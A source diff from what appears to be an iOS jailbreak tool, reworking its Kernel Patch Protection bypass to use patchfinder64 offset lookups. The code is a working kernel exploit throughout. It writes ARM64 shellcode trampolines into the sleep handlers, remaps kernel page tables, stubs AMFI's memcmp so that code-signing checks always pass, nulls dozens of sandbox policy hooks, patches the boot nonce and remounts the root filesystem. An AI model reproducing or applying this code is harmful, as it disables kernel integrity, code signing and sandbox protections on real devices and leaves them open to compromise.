@@ -12,7 +12,8 @@ extern "C"{
 
 #include "common.h"
 #include "exploit64.h"
-
+#include "patchfinder64.h"
+    
 typedef mach_port_t io_service_t;
 typedef mach_port_t io_connect_t;
 extern const mach_port_t kIOMasterPortDefault;
@@ -52,7 +53,7 @@ extern int (*dsystem)(const char *);
 
 mach_port_t tfp0 = 0;
 
-void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi);
+void kpp(uint64_t kernbase, uint64_t slide);
 void runLaunchDaemons(void);
 
 void suspend_all_threads() {
@@ -106,7 +107,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     tihmstar::offsetfinder64 *fi = static_cast<tihmstar::offsetfinder64 *>(data);
     
     try {
-        kpp(kbase,kbase-KBASE,fi);
+        kpp(kbase,kbase-KBASE);
     } catch (tihmstar::exception &e) {
         LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
@@ -178,38 +179,42 @@ uint64_t physalloc(uint64_t size) {
     return ret;
 }
 
-void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
+void kpp(uint64_t kernbase, uint64_t slide){
     postProgress(@"running KPP bypass");
+    
     checkvad();
-
+    
     uint64_t entryp;
-
-    uint64_t gStoreBase = (uint64_t)fi->find_gPhysBase() + slide;
-
+    
+    int rv = init_kernel(kernbase, NULL);
+    assert(rv == 0);
+    
+    uint64_t gStoreBase = find_gPhysBase();
+    
     gPhysBase = ReadAnywhere64(gStoreBase);
     gVirtBase = ReadAnywhere64(gStoreBase+8);
-
-    entryp = (uint64_t)fi->find_entry() + slide;
+    
+    entryp = find_entry() + slide;
     uint64_t rvbar = entryp & (~0xFFF);
-
-    uint64_t cpul = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;
-
-    uint64_t optr = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;
+    
+    uint64_t cpul = find_register_value(rvbar+0x40, 1);
+    
+    uint64_t optr = find_register_value(rvbar+0x50, 20);
 
     NSLog(@"%llx", optr);
-
+    
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     uint64_t cpu = ReadAnywhere64(cpu_list);
-
-    uint64_t pmap_store = (uint64_t)fi->find_kernel_pmap() + slide;
+    
+    uint64_t pmap_store = find_kernel_pmap();
     NSLog(@"pmap: %llx", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
-
-
-
-
+    
+    
+    
+    
     uint64_t shellcode = physalloc(0x4000);
-
+    
     /*
      ldr x30, a
      ldr x0, b
@@ -221,28 +226,30 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
      .quad 0
      none of that squad shit tho, straight gang shit. free rondonumbanine
      */
-
+    
     WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
     WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
-
+    
     WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
     WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-
+    
     char buf[0x100];
     copyin(buf, optr, 0x100);
     copyout(shellcode+0x300, buf, 0x100);
-
+    
     uint64_t physcode = findphys_real(shellcode);
-
+    
+    
+    
     NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
-
+    
     uint64_t idlesleep_handler = 0;
-
+    
     uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
     int z = 0;
-
+    
     int idx = 0;
     int ridx = 0;
     while (cpu) {
@@ -251,15 +258,15 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
             NSLog(@"already jailbroken, bailing out");
             return;
         }
-
-
+        
+        
         if (!idlesleep_handler) {
             WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
             WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
-
+            
             idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
-
-
+            
+            
             uint32_t* opcz = (uint32_t*)malloc(0x1000);
             copyin(opcz, idlesleep_handler, 0x1000);
             idx = 0;
@@ -276,47 +283,47 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
                 }
                 ridx++;
             }
-
-
+            
+            
         }
-
+        
         NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
         NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
-
+        
         plist[z++] = cpu+0x130;
         cpu_list += 0x10;
         cpu = ReadAnywhere64(cpu_list);
     }
-
-
+    
+    
     uint64_t shc = physalloc(0x4000);
-
-    uint64_t regi = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
-    uint64_t regd = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;
-
+    
+    uint64_t regi = find_register_value(idlesleep_handler+12, 30);
+    uint64_t regd = find_register_value(idlesleep_handler+24, 30);
+    
     NSLog(@"%llx - %llx", regi, regd);
-
+    
     for (int i = 0; i < 0x500/4; i++) {
         WriteAnywhere32(shc+i*4, 0xd503201f);
     }
-
+    
     /*
      isvad 0 == 0x4000
      */
-
+    
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
-
-    uint64_t ttbr0_real = fi->find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;
-
+    
+    uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
+    
     NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
-
+    
     char* bbuf = (char*)malloc(0x4000);
     copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
     copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
-
+    
     uint64_t physp = findphys_real(level0_pte);
-
-
+    
+    
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
     WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
     WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
@@ -328,7 +335,7 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
     WriteAnywhere32(shc+32, 0xd65f03c0); // ret
     WriteAnywhere64(shc+40, regi);
     WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
-
+    
     shc+=0x100;
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
     WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
@@ -355,16 +362,16 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
         WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80
         WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
         WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
-
+        
     }
-
+    
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     mach_vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
     {
         int n = 0;
-
+        
         WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr    x1, #60
         WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr    x0, #40
         WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr    TTBR1_EL1, x0
@@ -380,26 +387,26 @@ void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){
         WriteAnywhere64(kppsh+n, physp); n+=8;
         WriteAnywhere64(kppsh+n, physp); n+=8;
     }
-
+    
     mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
     WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
-
+    
     WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
     WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
-
+    
     /*
-
+     
      pagetables are now not real anymore, they're real af
-
+     
      */
-
-    uint64_t cpacr_addr = (uint64_t)fi->find_cpacr_write() + slide;
+    
+    uint64_t cpacr_addr = find_cpacr_write();
 #define PSZ (isvad ? 0x1000 : 0x4000)
 #define PMK (PSZ-1)
-
-
+    
+    
 #define RemapPage_(address) \
 pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
 uint64_t tte = ReadAnywhere64(tte_addr);\
@@ -423,14 +430,14 @@ TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
 TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
 WriteAnywhere64(tte_addr, tte);\
 }, level1_table, isvad ? 1 : 2);
-
+    
 #define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
-
+    
     uint64_t* remappage = (uint64_t*)calloc(512, 8);
-
+    
     int remapcnt = 0;
-
-
+    
+    
 #define RemapPage(x)\
 {\
 int fail = 0;\
@@ -445,136 +452,188 @@ RemapPage_(x+PSZ);\
 remappage[remapcnt++] = (x & (~PMK));\
 }\
 }
-
+    
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
-
-
-    uint64_t shtramp = kernbase + ((const struct mach_header *)fi->kdata())->sizeofcmds + sizeof(struct mach_header_64);
+    
+    
+    uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(cpacr_addr);
     WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
-
+    
     RemapPage(shtramp);
     WriteAnywhere32(NewPointer(shtramp), 0x58000041);
     WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
     WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
-
-
-    WriteAnywhere64((uint64_t)fi->find_idlesleep_str_loc()+slide, physcode+0x100);
-    WriteAnywhere64((uint64_t)fi->find_deepsleep_str_loc()+slide, physcode+0x200);
-
-
-    //kernelpatches
-    postProgress(@"patching kernel");
-
-    std::vector<tihmstar::patchfinder64::patch> kernelpatches;
-    kernelpatches.push_back(fi->find_i_can_has_debugger_patch_off());
-
-    std::vector<tihmstar::patchfinder64::patch> nosuid = fi->find_nosuid_off();
-
-    kernelpatches.push_back(fi->find_remount_patch_offset());
-    kernelpatches.push_back(fi->find_lwvm_patch_offsets());
-    kernelpatches.push_back(nosuid.at(0));
-    kernelpatches.push_back(nosuid.at(1));
-    kernelpatches.push_back(fi->find_proc_enforce());
-    kernelpatches.push_back(fi->find_amfi_patch_offsets());
-    kernelpatches.push_back(fi->find_cs_enforcement_disable_amfi());
-    kernelpatches.push_back(fi->find_amfi_substrate_patch());
-    kernelpatches.push_back(fi->find_nonceEnabler_patch());
-
-    try {
-        kernelpatches.push_back(fi->find_sandbox_patch());
-    } catch (tihmstar::exception &e) {
-        NSLog(@"WARNING: failed to find sandbox_patch! Assuming we're on x<10.3 and continueing anyways!");
+    
+    uint64_t lwvm_write = find_lwvm_mapio_patch();
+    uint64_t lwvm_value = find_lwvm_mapio_newj();
+    RemapPage(lwvm_write);
+    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
+    
+    
+    uint64_t kernvers = find_str("Darwin Kernel Version");
+    uint64_t release = find_str("RELEASE_ARM");
+    
+    RemapPage(kernvers-4);
+    WriteAnywhere32(NewPointer(kernvers-4), 1);
+    
+    RemapPage(release);
+    if (NewPointer(release) == (NewPointer(release+11) - 11)) {
+        copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
     }
-
-
-    auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
-        patch.slide(slide);
-        NSString * str = @"patching at: %p [";
-        for (int i=0; i<patch._patchSize; i++) {
-            str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
+    
+    
+    /*
+     nonceenabler
+     */
+    
+    {
+        uint64_t sysbootnonce = find_sysbootnonce();
+        NSLog(@"%x", ReadAnywhere32(sysbootnonce));
+        
+        WriteAnywhere32(sysbootnonce, 1);
+    }
+    
+    
+    
+    uint64_t memcmp_got = find_amfi_memcmpstub();
+    uint64_t ret1 = find_ret_0();
+    
+    RemapPage(memcmp_got);
+    WriteAnywhere64(NewPointer(memcmp_got), ret1);
+    
+    uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
+    NSLog(@"fref at %llx", fref);
+    
+    uint64_t amfiops = find_amfiops();
+    
+    NSLog(@"amfistr at %llx", amfiops);
+    
+    
+    {
+        /*
+         amfi
+         */
+        
+        uint64_t sbops = amfiops;
+        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
+        
+        uint64_t nopag = sbops_end - sbops;
+        
+        for (int i = 0; i < nopag; i+= PSZ) {
+            RemapPage(((sbops + i) & (~PMK)));
         }
-        NSLog([str stringByAppendingString:@"]"],patch._location);
-        RemapPage((uint64_t)(patch._location+slide));
-        for (size_t i=0; i<patch._patchSize;i+=4) {
-            int diff = (int)(patch._patchSize-i);
-            if (diff >=8){
-                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), *(uint64_t*)((uint8_t*)patch._patch+i));
-            }else{
-                uint64_t p = ReadAnywhere64((uint64_t)patch._location+slide+i);
-                p &= ~(((uint64_t)1<<(8*diff))-1);
-                p |= ((*(uint64_t*)((uint8_t*)patch._patch+i)) % ((uint64_t)1<<(8*diff)));
-                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), p);
-            }
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
+    }
+    
+    
+    /*
+     first str
+     */
+    while (1) {
+        uint32_t opcode = ReadAnywhere32(fref);
+        if ((opcode & 0xFFC00000) == 0xF9000000) {
+            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+            int32_t myreg = (opcode >> 5) & 0x1f;
+            uint64_t rgz = find_register_value(fref, myreg)+outhere;
+            
+            WriteAnywhere64(rgz, physcode+0x200);
+            break;
         }
-    };
-
-
-    for (auto patch : kernelpatches){
-        dopatch(patch);
+        fref += 4;
     }
-
-    postProgress(@"patching sandbox");
-    uint64_t sbops = (uint64_t)fi->find_sbops()+slide;
-    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
-
-    uint64_t nopag = (sbops_end - sbops)/(PSZ);
-
-    for (int i = 0; i < nopag; i++) {
-        RemapPage(((sbops + i*(PSZ)) & (~PMK)));
+    
+    fref += 4;
+    
+    /*
+     second str
+     */
+    while (1) {
+        uint32_t opcode = ReadAnywhere32(fref);
+        if ((opcode & 0xFFC00000) == 0xF9000000) {
+            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+            int32_t myreg = (opcode >> 5) & 0x1f;
+            uint64_t rgz = find_register_value(fref, myreg)+outhere;
+            
+            WriteAnywhere64(rgz, physcode+0x100);
+            break;
+        }
+        fref += 4;
     }
-
-    printf("Found sbops 0x%llx\n",sbops);
-
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
-    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
-
-    uint64_t marijuanoff = (uint64_t)fi->memmem("RELEASE_ARM",sizeof("RELEASE_ARM")-1)+slide;
-
-    // smoke trees
-    RemapPage(marijuanoff);
-    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)"Marijuan");
-
+    
+    {
+        /*
+         sandbox
+         */
+        
+        uint64_t sbops = find_sbops();
+        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
+        
+        uint64_t nopag = (sbops_end - sbops)/(PSZ);
+        
+        for (int i = 0; i < nopag; i++) {
+            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
+        }
+        
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
+        
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
+        
+    }
+    
+    {
+        uint64_t point = find_amfiret()-0x18;
+        
+        RemapPage((point & (~PMK)));
+        uint64_t remap = NewPointer(point);
+        
+        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
+        
+        WriteAnywhere32(remap, 0x58000041);
+        WriteAnywhere32(remap + 4, 0xd61f0020);
+        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
+        
+    }
+    
     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
     }
-
-    //check for i_can_has_debugger
-    while (ReadAnywhere32((uint64_t)kernelpatches.at(0)._location+slide) != 1) {
+    
+    while (ReadAnywhere32(kernvers-4) != 1) {
         sleep(1);
     }
+    
 
     char* nm = strdup("/dev/disk0s1s1");
     int mntr = mount("hfs", "/", 0x10000, &nm);
